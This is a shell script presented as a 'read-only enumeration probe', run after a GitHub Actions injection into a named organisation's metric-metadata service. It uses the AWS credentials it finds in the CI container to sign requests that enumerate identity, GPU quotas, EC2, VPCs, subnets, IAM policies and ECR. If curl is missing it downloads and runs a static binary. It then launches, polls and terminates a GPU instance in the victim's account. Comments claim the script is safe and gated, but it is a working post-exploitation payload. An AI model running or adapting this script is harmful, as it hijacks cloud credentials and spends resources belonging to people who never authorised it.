#!/bin/sh
# c211-i109093 read-only enumeration probe for the Matter-Tech/metric-metadata-service
# issue_comment -> gh pr checkout fork-PR-head -> mikefarah/yq eval injection.
# Runs INSIDE the alpine yq action container (busybox). Prints only non-secret metadata.
# Never prints AWS secret values. Phase A is read-only; Phase B deploys at most ONE
# minimal self-terminating marker GPU and only when every gate below proves deployable
# capacity + permission. Any failure path terminates the marker instance.
exec 1>&2
set +e
B="C211_I109093"
echo "===== $B PROBE BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
echo "host=$(hostname) user=$(id -un) uid=$(id -u) cwd=$(pwd) kernel=$(uname -sr)"
echo "AWS_env_count=$(env | grep -c '^AWS_')"
echo "AWS_ROLE_ARN=${AWS_ROLE_ARN:-<unset>}"
echo "AWS_REGION=${AWS_REGION:-<unset>} AWS_DEFAULT_REGION=${AWS_DEFAULT_REGION:-<unset>}"
echo "AWS_STS_REGIONAL_ENDPOINTS=${AWS_STS_REGIONAL_ENDPOINTS:-<unset>}"
if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then echo "AWS_ACCESS_KEY_ID_present=yes len=${#AWS_ACCESS_KEY_ID}"; else echo "AWS_ACCESS_KEY_ID_present=no"; fi
if [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then echo "AWS_SECRET_ACCESS_KEY_present=yes len=${#AWS_SECRET_ACCESS_KEY}"; else echo "AWS_SECRET_ACCESS_KEY_present=no"; fi
if [ -n "${AWS_SESSION_TOKEN:-}" ]; then echo "AWS_SESSION_TOKEN_present=yes len=${#AWS_SESSION_TOKEN}"; else echo "AWS_SESSION_TOKEN_present=no"; fi
echo "GOOGLE_APPLICATION_CREDENTIALS=${GOOGLE_APPLICATION_CREDENTIALS:-<unset>}"
echo "CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE=${CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE:-<unset>}"
for t in curl wget openssl apk jq python3 aws gcloud az git base64; do echo "TOOL $t = $(command -v $t 2>/dev/null || echo MISSING)"; done

CURL=$(command -v curl 2>/dev/null || true)
if [ -z "$CURL" ]; then
  echo "--- bootstrapping curl via apk ---"
  apk add --no-cache curl >/dev/null 2>&1
  CURL=$(command -v curl 2>/dev/null || true)
fi
if [ -z "$CURL" ]; then
  echo "--- apk unavailable; trying static curl download ---"
  wget -q -O /tmp/curl.bin https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64 2>/dev/null && chmod +x /tmp/curl.bin && CURL=/tmp/curl.bin
fi
echo "curl_path=${CURL:-MISSING}"
if [ -n "$CURL" ]; then "$CURL" --version 2>&1 | head -2; fi
if [ -z "$CURL" ]; then echo "$B NO_HTTP_CLIENT -> aborting enumeration"; echo "===== $B PROBE END ====="; exit 0; fi

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-eu-central-1}}"
echo "effective_region=$REGION"

sig() { # sig <region> <service> <url> [extra curl args...]
  R="$1"; S="$2"; U="$3"; shift 3
  "$CURL" -sS --max-time 25 --aws-sigv4 "aws:amz:${R}:${S}" \
    --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" \
    -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" "$@" "$U"
  echo
}

echo "===== STS GetCallerIdentity (regional) ====="
SIG_OUT=$(sig "$REGION" sts "https://sts.${REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15")
echo "$SIG_OUT" | head -c 2000
echo "===== STS GetCallerIdentity (global endpoint) ====="
sig us-east-1 sts "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" | head -c 2000

echo "===== ServiceQuotas GPU vCPU quotas (L-DB2E81BA G/VT on-demand, L-3819A6DF G/VT spot, L-417A185B P on-demand) ====="
for R in "$REGION" us-east-1 us-west-2 eu-west-1 ap-northeast-1; do
  for Q in L-DB2E81BA L-3819A6DF L-417A185B; do
    echo "--- QUOTA $Q region $R ---"
    sig "$R" servicequotas "https://servicequotas.${R}.amazonaws.com/" \
      -H 'Content-Type: application/x-amz-json-1.1' \
      -H 'X-Amz-Target: ServiceQuotasV20190624.GetServiceQuota' \
      -d "{\"ServiceCode\":\"ec2\",\"QuotaCode\":\"$Q\"}" | head -c 1200
  done
done

echo "===== EC2 DescribeInstances (region $REGION, max 8) ====="
sig "$REGION" ec2 "https://ec2.${REGION}.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15&MaxResults=8" | head -c 6000

echo "===== EC2 DescribeInstanceTypeOfferings GPU families ($REGION) ====="
sig "$REGION" ec2 "https://ec2.${REGION}.amazonaws.com/?Action=DescribeInstanceTypeOfferings&Version=2016-11-15&LocationType=region&MaxResults=50&Filter.1.Name=instance-type&Filter.1.Value.1=g4dn.xlarge&Filter.1.Value.2=g5.xlarge&Filter.1.Value.3=g6.xlarge&Filter.1.Value.4=g6e.xlarge&Filter.1.Value.5=p3.2xlarge&Filter.1.Value.6=p4d.24xlarge&Filter.1.Value.7=p5.48xlarge" | head -c 4000

echo "===== EC2 DescribeVpcs ($REGION) ====="
sig "$REGION" ec2 "https://ec2.${REGION}.amazonaws.com/?Action=DescribeVpcs&Version=2016-11-15" | head -c 5000

echo "===== EC2 DescribeSubnets ($REGION) ====="
sig "$REGION" ec2 "https://ec2.${REGION}.amazonaws.com/?Action=DescribeSubnets&Version=2016-11-15" | head -c 7000

echo "===== EC2 RunInstances DryRun=true g4dn.xlarge ($REGION, creates nothing) ====="
sig "$REGION" ec2 "https://ec2.${REGION}.amazonaws.com/?Action=RunInstances&Version=2016-11-15&DryRun=true&ImageId=ami-0d6dd9e8265d48906&InstanceType=g4dn.xlarge&MinCount=1&MaxCount=1" | head -c 2000

echo "===== IAM role policy enumeration (read-only) ====="
ARN=$(echo "$SIG_OUT" | sed -n 's:.*<Arn>\(.*\)</Arn>.*:\1:p' | head -1)
echo "caller_arn=$ARN"
ROLE=$(echo "$ARN" | sed 's#.*/##')
if [ -n "$ROLE" ] && [ "$ROLE" != "$ARN" ]; then
  echo "role_name=$ROLE"
  echo "--- iam ListAttachedRolePolicies ---"
  sig "$REGION" iam "https://iam.amazonaws.com/?Action=ListAttachedRolePolicies&Version=2010-05-08&RoleName=${ROLE}" | head -c 4000
  echo "--- iam ListRolePolicies ---"
  sig "$REGION" iam "https://iam.amazonaws.com/?Action=ListRolePolicies&Version=2010-05-08&RoleName=${ROLE}" | head -c 2000
else
  echo "caller is not a role (no role policy enumeration)"
fi

echo "===== ECR DescribeRepositories ====="
sig "$REGION" ecr "https://ecr.${REGION}.amazonaws.com/" \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AmazonEC2ContainerRegistry_V20150921.DescribeRepositories' | head -c 3000

echo "===== GCP / Azure presence ====="
[ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && ls -la "$GOOGLE_APPLICATION_CREDENTIALS" 2>&1 | head -3
command -v gcloud >/dev/null 2>&1 && { gcloud auth list 2>&1 | head -5; gcloud config list 2>&1 | head -10; } || echo "gcloud: not installed in container"
command -v az >/dev/null 2>&1 && { az account show 2>&1 | head -10; } || echo "az: not installed in container"

###############################################################################
# PHASE B — single minimal self-terminating marker GPU, strictly gated.
# Gate: a GPU-family vCPU quota value >= 4 in region R, a proven RunInstances
# DryRun (DryRunOperation) in R, a resolvable ECS-GPU AMI and a usable subnet.
# No gate passes => no resource is created.
###############################################################################
echo "===== MARKER GATE EVALUATION ====="
MARKER_REGION=""
MARKER_QUOTA=""
for R in "$REGION" us-east-1 us-west-2 eu-west-1 ap-northeast-1; do
  QJ=$(sig "$R" servicequotas "https://servicequotas.${R}.amazonaws.com/" \
      -H 'Content-Type: application/x-amz-json-1.1' \
      -H 'X-Amz-Target: ServiceQuotasV20190624.GetServiceQuota' \
      -d '{"ServiceCode":"ec2","QuotaCode":"L-DB2E81BA"}' | head -c 1200)
  QV=$(echo "$QJ" | sed -n 's/.*"Value":[[:space:]]*\([0-9.]*\).*/\1/p' | head -1)
  echo "gate_region=$R L-DB2E81BA=$QV"
  case "$QV" in ''|*[!0-9.]*) continue;; esac
  GE4=$(awk -v v="$QV" 'BEGIN{print (v>=4)?"yes":"no"}' 2>/dev/null)
  if [ "$GE4" != "yes" ]; then continue; fi
  DRY=$(sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=RunInstances&Version=2016-11-15&DryRun=true&ImageId=ami-0d6dd9e8265d48906&InstanceType=g4dn.xlarge&MinCount=1&MaxCount=1")
  echo "gate_region=$R dryrun=$(echo "$DRY" | tr -d '\n' | head -c 400)"
  echo "$DRY" | grep -q "DryRunOperation" && { MARKER_REGION="$R"; MARKER_QUOTA="$QV"; break; }
done

if [ -z "$MARKER_REGION" ]; then
  echo "MARKER_DECISION=NO_DEPLOY: no region with positive GPU vCPU quota AND proven RunInstances permission"
  echo "===== $B PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
  exit 0
fi

echo "MARKER_DECISION=DEPLOY region=$MARKER_REGION quota_vcpus=$MARKER_QUOTA"
AMI=""
for N in 'amzn2-ami-ecs-gpu-hvm-2.0.*-x86_64-ebs' 'al2023-ami-ecs-gpu-x86_64-*' 'amzn2-ami-ecs-gpu-hvm-2.0.*'; do
  IJ=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=DescribeImages&Version=2016-11-15&Owner.1=amazon&Filter.1.Name=name&Filter.1.Value.1=${N}&Filter.2.Name=state&Filter.2.Value.1=available&MaxResults=5")
  echo "ami_query=$N -> $(echo "$IJ" | grep -o '<imageId>ami-[a-z0-9]*</imageId>' | head -1)"
  AMI=$(echo "$IJ" | grep -o '<imageId>ami-[a-z0-9]*</imageId>' | head -1 | sed 's/<[^>]*>//g')
  [ -n "$AMI" ] && break
done
echo "ami=$AMI"
SUBNET=""
if [ -n "$AMI" ]; then
  SNJ=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=DescribeSubnets&Version=2016-11-15")
  SUBNET=$(echo "$SNJ" | grep -o '<subnetId>subnet-[a-z0-9]*</subnetId>' | head -1 | sed 's/<[^>]*>//g')
fi
echo "subnet=$SUBNET"

if [ -z "$AMI" ] || [ -z "$SUBNET" ]; then
  echo "MARKER_DECISION=NO_DEPLOY: AMI or subnet unavailable (ami=${AMI:-none} subnet=${SUBNET:-none})"
  echo "===== $B PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
  exit 0
fi

UD_PATH=/tmp/c211_marker_ud.sh
cat > "$UD_PATH" <<'UDEOF'
#!/bin/bash
exec > /dev/console 2>&1
echo "C211_I109093_MARKER_BEGIN"
hostname
nvidia-smi -L || echo "C211_NO_NVIDIA_SMI"
echo "C211_I109093_MARKER_END"
shutdown -P +6
UDEOF
UD_B64=$(base64 < "$UD_PATH" | tr -d '\n')
echo "userdata_bytes=$(wc -c < "$UD_PATH") b64_len=${#UD_B64}"

RUN=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/" \
  --data-urlencode "Action=RunInstances" \
  --data-urlencode "Version=2016-11-15" \
  --data-urlencode "ImageId=${AMI}" \
  --data-urlencode "InstanceType=g4dn.xlarge" \
  --data-urlencode "MinCount=1" --data-urlencode "MaxCount=1" \
  --data-urlencode "SubnetId=${SUBNET}" \
  --data-urlencode "InstanceInitiatedShutdownBehavior=terminate" \
  --data-urlencode "UserData=${UD_B64}" \
  --data-urlencode "TagSpecification.1.ResourceType=instance" \
  --data-urlencode "TagSpecification.1.Tag.1.Key=c211-i109093-marker" \
  --data-urlencode "TagSpecification.1.Tag.1.Value=marker")
IID=$(echo "$RUN" | grep -o '<instanceId>i-[a-z0-9]*</instanceId>' | head -1 | sed 's/<[^>]*>//g')
echo "run_instances_instance=$IID"
echo "$RUN" | head -c 2500
if [ -z "$IID" ]; then
  echo "MARKER_DECISION=DEPLOY_FAILED: RunInstances returned no instance id"
  echo "===== $B PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
  exit 0
fi

UUID_LINE=""
CONSOLE_SEEN=0
i=0
while [ $i -lt 10 ]; do
  sleep 15
  i=$((i+1))
  CO=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=GetConsoleOutput&Version=2016-11-15&InstanceId=${IID}")
  OB=$(echo "$CO" | sed -n 's:.*<Output>\(.*\)</Output>.*:\1:p' | head -1)
  if [ -n "$OB" ]; then
    CONSOLE_SEEN=1
    echo "$OB" | base64 -d 2>/dev/null > /tmp/c211_console.txt
    UUID_LINE=$(grep -o 'GPU-[0-9a-fA-F-]*' /tmp/c211_console.txt | head -3 | tr '\n' ' ')
    echo "console_poll=$i output_bytes=$(wc -c < /tmp/c211_console.txt) uuid_lines=${UUID_LINE:-none}"
    [ -n "$UUID_LINE" ] && break
    grep -q "C211_I109093_MARKER_END" /tmp/c211_console.txt && break
  else
    echo "console_poll=$i empty"
  fi
  ST=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15&InstanceIds.1=${IID}" | grep -o '<name>[a-z-]*</name>' | head -1)
  echo "instance_state_poll=$i $ST"
done

echo "marker_device_uuid=${UUID_LINE:-NONE}"
echo "===== TERMINATE + READBACK ====="
sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=TerminateInstances&Version=2016-11-15&InstanceIds.1=${IID}" | head -c 1500
j=0
while [ $j -lt 8 ]; do
  sleep 15
  j=$((j+1))
  D=$(sig "$MARKER_REGION" ec2 "https://ec2.${MARKER_REGION}.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15&InstanceIds.1=${IID}")
  ST=$(echo "$D" | grep -o '<name>[a-z-]*</name>' | head -1)
  echo "cleanup_poll=$j state=$ST"
  echo "$D" | grep -q 'InvalidInstanceID.NotFound' && { echo "cleanup_readback=ABSENT_NOT_FOUND"; break; }
  echo "$ST" | grep -q 'terminated' && { echo "cleanup_readback=TERMINATED"; break; }
done
echo "===== $B PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
